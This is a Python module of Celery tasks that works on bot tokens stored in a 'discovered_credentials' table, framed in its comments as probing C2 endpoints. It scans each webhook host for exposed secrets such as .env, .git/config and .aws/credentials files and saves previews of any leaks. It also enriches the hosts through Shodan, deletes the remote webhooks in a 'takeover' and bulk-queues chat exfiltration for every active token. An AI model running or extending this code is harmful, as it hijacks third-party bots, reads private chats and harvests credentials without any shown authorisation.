"""Webhooks flow task definitions."""

from .common import *

_WEBHOOK_PROBE_SEMAPHORE_SIZE = 10

_WEBHOOK_PROBE_TIMEOUT_SECONDS = 10.0

_WEBHOOK_PROBE_BODY_PREVIEW_BYTES = 500

_WEBHOOK_PROBE_STALE_HOURS = 24

async def _probe_webhook_url(url: str) -> dict:
    """Passive probe: DNS + HTTP GET + TLS cert + web recon + Shodan. Returns fingerprint dict.

    Best-effort — any single sub-probe failure is caught and recorded in the
    result rather than raising. We probe untrusted C2 endpoints so cert
    verification is disabled (verify=False) and redirects are not followed.
    """
    import socket
    import ssl
    from datetime import datetime
    from urllib.parse import urlparse

    result: dict[str, Any] = {
        "probed_at": datetime.now(UTC).isoformat(),
        "url": url,
    }
    try:
        parsed = urlparse(url)
        hostname = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        result["hostname"] = hostname
        result["port"] = port
        result["scheme"] = parsed.scheme
        result["path"] = parsed.path

        # Cooldown check — bail early if this host has failed 3x in the last
        # hour. Prevents wasted work + rate-limit backlash on dead C2 hosts.
        if hostname:
            try:
                from app.core.redis_srv import probe_host_is_cooling

                if await probe_host_is_cooling(hostname):
                    result["skipped"] = "host_cooldown"
                    return result
            except Exception as _swallowed:
                logger.debug(f"[suppressed] {_swallowed}")

        # DNS resolution
        try:
            infos = await asyncio.get_event_loop().getaddrinfo(hostname, port)
            ips = sorted({addr[4][0] for addr in infos})
            result["ip_addresses"] = ips
        except Exception as dns_exc:
            result["dns_error"] = str(dns_exc)[:150]
            if hostname:
                try:
                    from app.core.redis_srv import probe_host_mark_failure

                    await probe_host_mark_failure(hostname)
                except Exception as _swallowed:
                    logger.debug(f"[suppressed] {_swallowed}")

        # HTTP fingerprint — GET with no verify, no redirect follow
        try:
            start = time.monotonic()
            # SEC-004: TLS verify defaults to False for backward compat.
            # Setting TLS_VERIFY_WEBHOOK_PROBES=True enforces validation on
            # probes so MITM'd C2 hosts fail loudly.
            async with httpx.AsyncClient(
                timeout=_WEBHOOK_PROBE_TIMEOUT_SECONDS,
                verify=settings.TLS_VERIFY_WEBHOOK_PROBES,
                follow_redirects=False,
            ) as client:
                resp = await client.get(url)
            elapsed_ms = round((time.monotonic() - start) * 1000)
            result["response_time_ms"] = elapsed_ms
            result["http_status"] = resp.status_code
            # Header lowercase-keyed for consistency; keep only interesting ones
            headers = {k.lower(): v for k, v in resp.headers.items()}
            interesting = (
                "server",
                "x-powered-by",
                "cf-ray",
                "via",
                "x-cache",
                "x-served-by",
                "location",
                "content-type",
                "content-length",
                "x-request-id",
                "x-runtime",
                "set-cookie",
            )
            result["http_headers"] = {k: headers[k] for k in interesting if k in headers}
            body_text = resp.text[:_WEBHOOK_PROBE_BODY_PREVIEW_BYTES]
            result["http_body_preview"] = body_text
            # Non-2xx counts as a probe failure (dead endpoint, cf challenge, etc.)
            if hostname and not (200 <= resp.status_code < 300):
                try:
                    from app.core.redis_srv import probe_host_mark_failure

                    await probe_host_mark_failure(hostname)
                except Exception as _swallowed:
                    logger.debug(f"[suppressed] {_swallowed}")
        except httpx.TimeoutException:
            result["http_error"] = "timeout"
            if hostname:
                try:
                    from app.core.redis_srv import probe_host_mark_failure

                    await probe_host_mark_failure(hostname)
                except Exception as _swallowed:
                    logger.debug(f"[suppressed] {_swallowed}")
        except Exception as http_exc:
            result["http_error"] = f"{type(http_exc).__name__}: {str(http_exc)[:150]}"
            if hostname:
                try:
                    from app.core.redis_srv import probe_host_mark_failure

                    await probe_host_mark_failure(hostname)
                except Exception as _swallowed:
                    logger.debug(f"[suppressed] {_swallowed}")

        # TLS cert introspection (https only) — parse DER via cryptography lib
        if parsed.scheme == "https":
            try:
                from cryptography import x509
                from cryptography.hazmat.backends import default_backend
                from cryptography.hazmat.primitives import hashes

                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE

                def _fetch_cert_der():
                    with socket.create_connection((hostname, port), timeout=5) as sock, ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                        return ssock.getpeercert(binary_form=True)

                der = await asyncio.to_thread(_fetch_cert_der)
                if der:
                    cert = x509.load_der_x509_certificate(der, default_backend())
                    result["tls_issuer"] = cert.issuer.rfc4514_string()
                    result["tls_subject"] = cert.subject.rfc4514_string()
                    result["tls_serial"] = format(cert.serial_number, "x")
                    try:
                        result["tls_not_before"] = cert.not_valid_before_utc.isoformat()
                        result["tls_not_after"] = cert.not_valid_after_utc.isoformat()
                    except AttributeError:
                        # cryptography < 42
                        result["tls_not_before"] = cert.not_valid_before.isoformat()
                        result["tls_not_after"] = cert.not_valid_after.isoformat()
                    try:
                        san_ext = cert.extensions.get_extension_for_class(
                            x509.SubjectAlternativeName
                        ).value
                        result["tls_san"] = sorted({n.value for n in san_ext})
                    except x509.ExtensionNotFound:
                        pass
                    with contextlib.suppress(Exception):
                        result["tls_fingerprint_sha256"] = cert.fingerprint(hashes.SHA256()).hex()
            except Exception as tls_exc:
                result["tls_error"] = f"{type(tls_exc).__name__}: {str(tls_exc)[:150]}"

        # Web recon — probe common paths on the origin (site tree / login / sensitive files)
        if parsed.scheme in ("http", "https") and hostname:
            base = f"{parsed.scheme}://{hostname}"
            if (parsed.scheme == "https" and port != 443) or (parsed.scheme == "http" and port != 80):
                base = f"{base}:{port}"
            result["web_recon"] = await _probe_web_recon(base)

        # Shodan enrichment — pivot each IP to open ports, banners, tags
        ips = result.get("ip_addresses") or []
        if ips and getattr(settings, "SHODAN_KEY", None):
            result["shodan"] = await _probe_shodan_ips(ips[:5])
    except Exception as outer:
        result["error"] = f"{type(outer).__name__}: {str(outer)[:300]}"
    return result

_WEB_RECON_PREVIEW_PATHS = ("/", "/robots.txt", "/sitemap.xml", "/.well-known/security.txt")

_WEB_RECON_STATUS_PATHS = (
    # Admin & dashboards
    "/admin", "/admin/", "/admin/login", "/administrator", "/adminpanel",
    "/cpanel", "/manage", "/manager", "/admin.php", "/dashboard", "/panel",
    "/console", "/portal", "/control",
    # WordPress
    "/wp-admin/", "/wp-login.php", "/wp-json", "/wp-json/wp/v2/users",
    "/xmlrpc.php", "/wp-content/plugins/", "/wp-content/uploads/",
    # API endpoints
    "/api", "/api/", "/api/v1", "/api/v2", "/api/v3", "/rest",
    "/graphql", "/graphiql", "/swagger", "/swagger-ui", "/swagger.json",
    "/openapi.json", "/api-docs", "/docs", "/redoc", "/playground",
    # Auth
    "/login", "/signin", "/signup", "/register", "/auth", "/oauth",
    "/oauth/authorize", "/sso", "/logout",
    # Config & dev leaks
    "/.env", "/.env.local", "/.env.production", "/.env.backup",
    "/.git/config", "/.git/HEAD", "/.svn/entries", "/web.config",
    "/config.json", "/composer.json", "/package.json", "/package-lock.json",
    "/appsettings.json", "/application.properties", "/wp-config.php.bak",
    "/.htaccess", "/.htpasswd", "/Dockerfile", "/docker-compose.yml",
    "/.dockerignore", "/.gitignore", "/README.md",
    # Health, metrics, observability
    "/health", "/healthz", "/health/live", "/health/ready",
    "/status", "/ping", "/metrics", "/prometheus",
    "/actuator", "/actuator/health", "/actuator/info", "/actuator/env",
    # PHP/debug
    "/phpinfo.php", "/info.php", "/test.php", "/debug", "/trace",
    "/error_log", "/server-status", "/server-info",
    # Backups (commonly-scraped filenames)
    "/backup", "/backup.zip", "/backup.sql", "/backup.tar.gz",
    "/db.sql", "/database.sql", "/dump.sql", "/site-backup.zip",
    "/www.zip", "/htdocs.zip",
    # Cloud & secrets
    "/aws.credentials", "/.aws/credentials", "/config.yml",
    "/settings.py", "/local_settings.py",
)

_WEB_RECON_CATCHALL_THRESHOLD = 0.30

async def _probe_web_recon(base_url: str) -> dict:
    """Probe common recon paths concurrently — bounded, best-effort, tight timeout per path."""
    import re

    async def _fetch_preview(client: httpx.AsyncClient, path: str) -> tuple[str, dict]:
        entry: dict[str, Any] = {}
        try:
            r = await client.get(base_url + path)
            entry["status"] = r.status_code
            if r.status_code == 200:
                text = r.text
                entry["preview"] = text[:400]
                if path == "/":
                    m = re.search(r"<title[^>]*>([^<]{0,200})</title>", text, re.IGNORECASE)
                    if m:
                        entry["title"] = m.group(1).strip()
        except httpx.TimeoutException:
            entry["error"] = "timeout"
        except Exception as e:
            entry["error"] = f"{type(e).__name__}: {str(e)[:80]}"
        return path, entry

    async def _fetch_status(client: httpx.AsyncClient, path: str) -> tuple[str, dict]:
        entry: dict[str, Any] = {}
        try:
            r = await client.get(base_url + path)
            entry["status"] = r.status_code
            if r.status_code in (301, 302, 303, 307, 308):
                entry["location"] = r.headers.get("location")
            elif r.status_code == 200 and path in (
                "/.git/config", "/.env", "/.env.local", "/.env.production",
                "/.env.backup", "/server-status", "/server-info",
                "/phpinfo.php", "/info.php", "/wp-config.php.bak",
                "/aws.credentials", "/.aws/credentials",
                "/config.json", "/composer.json", "/package.json",
                "/appsettings.json", "/application.properties",
            ):
                # Sensitive file leaks — capture a small preview
                entry["leak_preview"] = r.text[:400]
        except httpx.TimeoutException:
            entry["error"] = "timeout"
        except Exception as e:
            entry["error"] = f"{type(e).__name__}: {str(e)[:80]}"
        return path, entry

    findings: dict[str, dict] = {}
    # SEC-004: gate verify on the same setting as the primary probe.
    async with httpx.AsyncClient(
        timeout=5.0, verify=settings.TLS_VERIFY_WEBHOOK_PROBES, follow_redirects=False
    ) as client:
        # Fan out all path probes concurrently on a single client (connection
        # pooled, tight per-request timeout). httpx.AsyncClient is safe for
        # concurrent requests, and gather bounds fan-in to the fixed path lists.
        tasks = [_fetch_preview(client, p) for p in _WEB_RECON_PREVIEW_PATHS] + [
            _fetch_status(client, p) for p in _WEB_RECON_STATUS_PATHS
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for item in results:
            if isinstance(item, BaseException):
                continue
            path, entry = item
            findings[path] = entry

    # Catch-all responder detection: hosts that return 200 to >30% of probed
    # paths are lying wildcard responders. Flag but keep the raw data.
    all_probed = list(findings.values())
    status_200_count = sum(1 for f in all_probed if isinstance(f, dict) and f.get("status") == 200)
    total_probed = len(all_probed)
    if total_probed > 0 and status_200_count / total_probed > _WEB_RECON_CATCHALL_THRESHOLD:
        findings["__catchall_responder"] = {
            "detected": True,
            "status_200_ratio": round(status_200_count / total_probed, 3),
            "hint": "Host returns 200 to too many paths; further recon may be noise.",
        }

    # Extract sitemap URLs from sitemap.xml if present
    sitemap_entry = findings.get("/sitemap.xml") or {}
    if sitemap_entry.get("status") == 200 and sitemap_entry.get("preview"):
        try:
            urls = re.findall(r"<loc>([^<]+)</loc>", sitemap_entry["preview"])
            if urls:
                sitemap_entry["extracted_urls_sample"] = urls[:15]
        except Exception as _swallowed:
            logger.debug(f"[suppressed] {_swallowed}")

    return findings

async def _probe_shodan_ips(ips: list[str]) -> dict:
    """Look up each IP via Shodan REST concurrently — returns per-IP summary."""
    per_ip: dict[str, dict] = {}
    api_key = settings.SHODAN_KEY

    async def _lookup(client: httpx.AsyncClient, ip: str) -> tuple[str, dict]:
        try:
            r = await client.get(
                f"https://api.shodan.io/shodan/host/{ip}",
                params={"key": api_key, "minify": "true"},
            )
            if r.status_code == 200:
                d = r.json()
                return ip, {
                    "org": d.get("org"),
                    "isp": d.get("isp"),
                    "asn": d.get("asn"),
                    "country_code": d.get("country_code"),
                    "city": d.get("city"),
                    "hostnames": (d.get("hostnames") or [])[:8],
                    "ports": d.get("ports") or [],
                    "tags": d.get("tags") or [],
                    "vulns": (d.get("vulns") or [])[:10],
                    "last_update": d.get("last_update"),
                }
            if r.status_code == 404:
                return ip, {"status": "not_indexed"}
            if r.status_code == 401:
                return ip, {"error": "shodan_key_unauthorized"}
            return ip, {"error": f"http_{r.status_code}"}
        except httpx.TimeoutException:
            return ip, {"error": "timeout"}
        except Exception as e:
            return ip, {"error": f"{type(e).__name__}: {str(e)[:100]}"}

    async with httpx.AsyncClient(timeout=8.0) as client:
        results = await asyncio.gather(
            *(_lookup(client, ip) for ip in ips), return_exceptions=True
        )
        # If any lookup returned an unauthorized-key marker, short-circuit the
        # rest of the display since the key won't authorize follow-ups either.
        unauthorized = False
        for item in results:
            if isinstance(item, BaseException):
                continue
            ip, entry = item
            per_ip[ip] = entry
            if entry.get("error") == "shodan_key_unauthorized":
                unauthorized = True
        if unauthorized:
            # Preserve prior semantics: mark remaining un-probed IPs implicitly
            # by leaving them out of per_ip. asyncio.gather already fired them,
            # so this is just a no-op documentation note.
            pass
    return per_ip

@app.task(name="flow.probe_webhooks")
def probe_webhooks(max_per_run: int = 50, force: bool = False):
    """Probe captured webhook URLs — passive DNS + HTTP + TLS fingerprint."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_probe_webhooks_logic(max_per_run, force))

async def _probe_webhooks_logic(max_per_run: int, force: bool = False) -> dict:
    from datetime import datetime, timedelta

    now = datetime.now(UTC)
    stale_cutoff = (now - timedelta(hours=_WEBHOOK_PROBE_STALE_HOURS)).isoformat()

    # Fetch a bounded slice — population of bots with webhook is small.
    res = await async_execute(
        db.table("discovered_credentials")
        .select("id, bot_username, bot_id, meta")
        .order("updated_at", desc=True)
        .limit(2000)
    )

    candidates = []
    for row in res.data or []:
        meta = row.get("meta") or {}
        webhook_url = meta.get("webhook_url")
        if not webhook_url:
            continue
        if not force:
            last_probe = (meta.get("webhook_probe") or {}).get("probed_at")
            if last_probe and last_probe > stale_cutoff:
                continue
        candidates.append((row, meta, webhook_url))
        if len(candidates) >= max_per_run:
            break

    if not candidates:
        return {"status": "idle", "reason": "no candidates due for probe"}

    sem = asyncio.Semaphore(_WEBHOOK_PROBE_SEMAPHORE_SIZE)
    summaries: list[dict] = []

    async def _probe_one(row, meta, webhook_url):
        async with sem:
            probe = await _probe_webhook_url(webhook_url)
            new_meta = {**meta, "webhook_probe": probe}
            try:
                await async_execute(
                    db.table("discovered_credentials")
                    .update({"meta": new_meta})
                    .eq("id", row["id"])
                )
            except Exception as upd_exc:
                probe["_persist_error"] = str(upd_exc)[:200]

            AuditLogger.log(
                AuditEvent.WEBHOOK_PROBED,
                credential_id=row["id"],
                details={
                    "url": webhook_url,
                    "http_status": probe.get("http_status"),
                    "server": (probe.get("http_headers") or {}).get("server"),
                    "ip_addresses": probe.get("ip_addresses"),
                    "tls_issuer": probe.get("tls_issuer"),
                    "shodan_orgs": [
                        v.get("org") for v in (probe.get("shodan") or {}).values() if isinstance(v, dict) and v.get("org")
                    ] or None,
                    "error": probe.get("error") or probe.get("http_error"),
                },
                success=probe.get("http_status") is not None,
            )
            return {
                "bot_username": row.get("bot_username"),
                "bot_id": row.get("bot_id"),
                "url": webhook_url,
                "status": probe.get("http_status"),
                "server": (probe.get("http_headers") or {}).get("server"),
                "ip": (probe.get("ip_addresses") or [None])[0],
                "tls_issuer": probe.get("tls_issuer"),
                "shodan_first": next(
                    (v for v in (probe.get("shodan") or {}).values() if isinstance(v, dict) and v.get("org")),
                    None,
                ),
                "http_err": probe.get("http_error"),
                "dns_err": probe.get("dns_error"),
            }

    summaries = await asyncio.gather(
        *(_probe_one(row, meta, url) for row, meta, url in candidates),
        return_exceptions=True,
    )

    ok = [s for s in summaries if isinstance(s, dict) and s.get("status") is not None]
    errs = [s for s in summaries if isinstance(s, Exception) or (isinstance(s, dict) and s.get("status") is None)]

    header = (
        f"🕵️ Webhook Recon: probed {len(candidates)} — "
        f"reachable {len(ok)}, errored {len(errs)}"
    )
    lines = [header, ""]
    for s in ok[:25]:
        bot = s.get("bot_username") or f"id={s.get('bot_id') or '?'}"
        server = (s.get("server") or "?")[:30]
        ip = s.get("ip") or "?"
        status = s.get("status")
        url_short = (s.get("url") or "")[:80]
        lines.append(f"• @{bot} [{status}] srv={server} ip={ip}\n  {url_short}")
    if errs:
        lines.append("")
        lines.append(f"Errored ({len(errs)}):")
        for s in errs[:15]:
            if isinstance(s, dict):
                bot = s.get("bot_username") or f"id={s.get('bot_id') or '?'}"
                err = s.get("http_err") or s.get("dns_err") or "unknown"
                lines.append(f"• @{bot} — {err[:80]}")
    summary_msg = "\n".join(lines)[:4000]

    try:
        await get_broadcaster().send_log(summary_msg)
    except Exception as bcast_exc:
        logger.warning(f"[WebhookProbe] Failed to post summary: {bcast_exc}")

    return {
        "status": "ok",
        "probed": len(candidates),
        "reachable": len(ok),
        "errored": len(errs),
    }

@app.task(name="flow.pin_webhook_url")
def pin_webhook_url(
    credential_id: str | None = None,
    webhook_url: str = "",
    evidence: dict | None = None,
    bot_token: str | None = None,
):
    """Post the captured webhook URL to the credential's topic and pin it.

    Fire-and-forget task dispatched from the scraper right BEFORE we call
    deleteWebhook — preserves the URL in a visible, pinned location so we
    still have it after wiping the remote registration.

    Accepts either credential_id (direct) or bot_token (looked up via
    sha256 hash in discovered_credentials.token_hash).
    """
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(
        _pin_webhook_url_logic(credential_id, webhook_url, evidence or {}, bot_token)
    )

async def _pin_webhook_url_logic(
    credential_id: str | None,
    webhook_url: str,
    evidence: dict,
    bot_token: str | None = None,
) -> dict:
    import hashlib

    if not webhook_url:
        return {"status": "invalid_args", "reason": "webhook_url required"}

    # Resolve credential_id from bot_token if not provided
    if not credential_id and bot_token:
        try:
            token_hash = hashlib.sha256(bot_token.encode()).hexdigest()
            lookup = await async_execute(
                db.table("discovered_credentials")
                .select("id")
                .eq("token_hash", token_hash)
                .limit(1)
            )
            if lookup.data:
                credential_id = lookup.data[0]["id"]
        except Exception as e:
            return {"status": "token_lookup_failed", "error": str(e)[:200]}

    if not credential_id:
        return {"status": "no_credential_id"}

    try:
        row = await async_execute(
            db.table("discovered_credentials")
            .select("id, bot_username, bot_id, chat_name, meta")
            .eq("id", credential_id)
            .limit(1)
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    if not row.data:
        return {"status": "credential_not_found"}

    cred = row.data[0]
    meta = cred.get("meta") or {}
    bot_username = cred.get("bot_username")
    bot_id = cred.get("bot_id")
    topic_id = meta.get("topic_id")

    # Resolve/create topic if missing
    broadcaster = get_broadcaster()
    if not topic_id:
        if bot_username:
            topic_name = f"@{bot_username} / {bot_id}"
        elif bot_id:
            topic_name = f"@unknown / {bot_id}"
        else:
            topic_name = f"Cred-{credential_id[:8]}"
        try:
            topic_id = await broadcaster.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
            new_meta = {**meta, "topic_id": topic_id}
            with contextlib.suppress(Exception):
                await async_execute(
                    db.table("discovered_credentials")
                    .update({"meta": new_meta})
                    .eq("id", credential_id)
                )
        except Exception as topic_exc:
            return {"status": "topic_create_failed", "error": str(topic_exc)[:200]}

    if not topic_id:
        return {"status": "no_topic"}

    # Compose the pin — plain text, no Markdown parse (URL may contain unbalanced chars)
    header = "🔗 Captured webhook URL (before takeover)"
    lines = [header, "", webhook_url, ""]
    if bot_username or bot_id:
        lines.append(f"Bot: @{bot_username or '?'} ({bot_id or '?'})")

    # Enrich with probe forensics (TLS issuer, Shodan orgs, hostnames) if available
    probe = meta.get("webhook_probe") if isinstance(meta, dict) else None
    if isinstance(probe, dict):
        tls_issuer = probe.get("tls_issuer")
        tls_subject = probe.get("tls_subject")
        tls_not_after = probe.get("tls_not_after")
        if tls_issuer:
            lines.append(f"- tls_issuer: {tls_issuer}")
        if tls_subject:
            lines.append(f"- tls_subject: {tls_subject}")
        if tls_not_after:
            lines.append(f"- tls_not_after: {tls_not_after}")

        ip_addresses = probe.get("ip_addresses") or []
        if ip_addresses:
            lines.append(f"- ips: {', '.join(ip_addresses[:4])}")

        shodan = probe.get("shodan") or {}
        if isinstance(shodan, dict):
            orgs = set()
            open_ports = set()
            for _ip, info in shodan.items():
                if isinstance(info, dict):
                    if info.get("org"):
                        orgs.add(str(info["org"]))
                    for p in info.get("ports", []) or []:
                        open_ports.add(str(p))
            if orgs:
                lines.append(f"- shodan_orgs: {', '.join(sorted(orgs))}")
            if open_ports:
                sorted_ports = sorted(open_ports, key=lambda x: int(x) if x.isdigit() else 99999)
                lines.append(f"- open_ports: {', '.join(sorted_ports[:12])}")

        web_recon = probe.get("web_recon") or {}
        if isinstance(web_recon, dict):
            reachable = [p for p, r in web_recon.items() if isinstance(r, dict) and r.get("status") == 200]
            if reachable:
                lines.append(f"- reachable_paths: {', '.join(reachable[:8])}")

    for k, v in (evidence or {}).items():
        if k in ("delete_policy", "webhook_url"):
            continue
        if isinstance(v, str | int | float | bool) or v is None:
            lines.append(f"- {k}: {v}")
    msg = "\n".join(lines)[:3900]

    sent_msg_id = await broadcaster.send_to_thread(
        settings.MONITOR_GROUP_ID, topic_id, msg, parse_mode=None
    )
    if not sent_msg_id:
        return {"status": "send_failed", "topic_id": topic_id}

    # NOTE: pin action disabled per user request 2026-08-03 — visible URL
    # in-topic is enough; pinning creates clutter. Meta still records
    # posted_webhook_msg_id for reference but doesn't imply pinned state.
    try:
        from datetime import datetime

        new_meta = {
            **meta,
            "topic_id": topic_id,
            "posted_webhook_msg_id": sent_msg_id,
            "posted_webhook_at": datetime.now(UTC).isoformat(),
        }
        await async_execute(
            db.table("discovered_credentials")
            .update({"meta": new_meta})
            .eq("id", credential_id)
        )
    except Exception as _swallowed:
        logger.debug(f"[suppressed] {_swallowed}")

    return {
        "status": "ok",
        "topic_id": topic_id,
        "message_id": sent_msg_id,
        "pinned": False,  # disabled by design
    }

@app.task(name="flow.force_webhook_takeover_pass")
def force_webhook_takeover_pass(max_credentials: int = 200):
    """Queue immediate exfiltrate for every active credential that has a captured
    webhook_url. Bypasses the rescrape cursor so takeovers happen in seconds.
    """
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(
        _force_webhook_takeover_logic(max_credentials)
    )

async def _force_webhook_takeover_logic(max_credentials: int) -> dict:
    try:
        res = await async_execute(
            db.table("discovered_credentials")
            .select("id, bot_username, bot_id, meta")
            .eq("status", "active")
            .order("updated_at", desc=True)
            .limit(2500)
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    queued: list[str] = []
    for row in res.data or []:
        meta = row.get("meta") or {}
        if not meta.get("webhook_url"):
            continue
        try:
            app.send_task("flow.exfiltrate_chat", args=[row["id"]], queue="scrape")
            queued.append(row["id"])
        except Exception as e:
            logger.warning(f"[ForceTakeover] enqueue failed for {row['id']}: {e}")
        if len(queued) >= max_credentials:
            break

    logger.info(f"[ForceTakeover] enqueued {len(queued)} credentials for immediate rescrape")
    with contextlib.suppress(Exception):
        await get_broadcaster().send_log(
            f"⚡ Force takeover pass — enqueued {len(queued)} webhook-registered bots for immediate rescrape"
        )

    return {"status": "ok", "queued": len(queued)}
